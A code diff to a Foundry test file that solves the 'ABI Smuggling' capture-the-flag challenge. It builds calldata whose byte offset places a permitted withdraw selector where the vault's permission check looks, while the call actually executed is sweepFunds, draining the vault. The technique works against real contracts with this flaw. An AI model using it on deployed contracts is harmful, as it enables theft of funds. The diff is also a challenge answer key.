@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -36,8 +36,18 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        // This is function selector for sweepFunds(address,address)
+        bytes32 deployerPermission = vault.getActionId(
+            hex"85fb709d",
+            deployer,
+            address(vault)
+        );
+        // This is function selector for withdraw(address,address,uint256)
+        bytes32 playerPermission = vault.getActionId(
+            hex"d9caed12",
+            player,
+            address(vault)
+        );
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -74,6 +84,39 @@ contract ABISmugglingChallenge is Test {
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
         
+        bytes4 executeFunctionSelector = AuthorizedExecutor.execute.selector; // 1cff79cd
+        bytes memory target = abi.encode(address(vault)); // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
+        bytes memory bytesOffsetPointer = abi.encodePacked(uint256(100)); // 0000000000000000000000000000000000000000000000000000000000000064
+        bytes32 fillerBytes; // 0000000000000000000000000000000000000000000000000000000000000000
+        bytes4 withdrawFunctionSelector = SelfAuthorizedVault.withdraw.selector; // d9caed12
+        bytes memory bytesLength = abi.encodePacked(uint256(68)); // 0000000000000000000000000000000000000000000000000000000000000044
+        bytes memory sweepFunction = abi.encodeWithSignature( // 85fb709d + 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
+            "sweepFunds(address,address)",
+            recovery,
+            address(token)
+        );
+        bytes memory data = abi.encodePacked(
+            executeFunctionSelector,
+            target,
+            bytesOffsetPointer,
+            fillerBytes,
+            withdrawFunctionSelector,
+            bytesLength,
+            sweepFunction
+        );
+        console.log("Data");
+        console.logBytes(data);
+        // 1cff79cd
+        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
+        // 0000000000000000000000000000000000000000000000000000000000000064
+        // 0000000000000000000000000000000000000000000000000000000000000000
+        // d9caed12
+        // 0000000000000000000000000000000000000000000000000000000000000044
+        // 85fb709d
+        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea
+        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
+
+        address(vault).call(data);
     }
 
     /**
@@ -82,6 +125,10 @@ contract ABISmugglingChallenge is Test {
     function _isSolved() private view {
         // All tokens taken from the vault and deposited into the designated recovery account
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
